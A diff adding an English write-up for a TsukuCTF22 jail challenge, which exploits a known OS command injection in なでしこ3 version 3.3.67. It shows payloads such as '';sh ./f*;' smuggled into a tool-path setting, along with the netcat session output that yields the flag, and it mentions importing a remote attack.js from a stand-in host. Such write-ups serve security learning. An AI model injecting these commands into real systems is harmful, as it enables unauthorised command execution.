@@ -110,3 +110,64 @@ $ nc tsukuctf.sechack365.com 31418
 flagが得られた。  
 
 ## TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}
+
+## Abstract
+This is a Jail related to a known vulnerability in なでしこ3
+First I intended to make a RCE question by `！「http://ctf.example.com/attack.js」を取り込み`. However, `ナデシコする` didn't work well. Thats why I use the vulnerability instead.  
+
+## Solve
+This seems Jail with なでしこ3.
+The ditributed source code is the following.
+```
+```
+<!-- XXXX:なでしこソース追加 -->  
+This program execute the given strings with `ナデシコする` which corresponds to the eval command after given strings are checked.
+You could RCE by `「ls」を起動` if it were not checked. We can't do this for this case.
+Btw, this is ver 3.3.67 which is not the latest one and this has [an issue related to cnako3](https://github.com/kujirahand/nadesiko3/issues/1325)
+This is OS command injection. You can use this vulnerability.
+
+```bash
+$ nc tsukuctf.sechack365.com 31418
+------------------------------------------------------------
+             _        _____           _ _
+ _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
+| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
+| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
+|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
+
+------------------------------------------------------------
+日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍
+/bin/sh: ': not found
+/bin/sh: : Permission denied
+[実行時エラー]app(1行目): Command failed: ''\''';sleep 10;'' x '' -o'' -y
+/bin/sh: ': not found
+/bin/sh: : Permission denied
+~~~
+```
+
+`sleep 10` make the thread sleep for 10 seconds.
+As the `flag` is blacklisted, you should specify like `./f*` to get `flag.txt`.
+I don't know why but sometimes we can't get the result. So get the result as Error Message through `sh` instead.
+```bash
+$ nc tsukuctf.sechack365.com 31418
+------------------------------------------------------------
+             _        _____           _ _
+ _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
+| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
+| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
+|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
+
+------------------------------------------------------------
+日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍
+/bin/sh: ': not found
+./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found
+/bin/sh: : Permission denied
+[実行時エラー]app(1行目): Command failed: ''\''';sh ./f*;'' x '' -o'' -y
+/bin/sh: ': not found
+./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found
+/bin/sh: : Permission denied
+~~~
+```
+Now you get the FLAG.
+
+## TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}
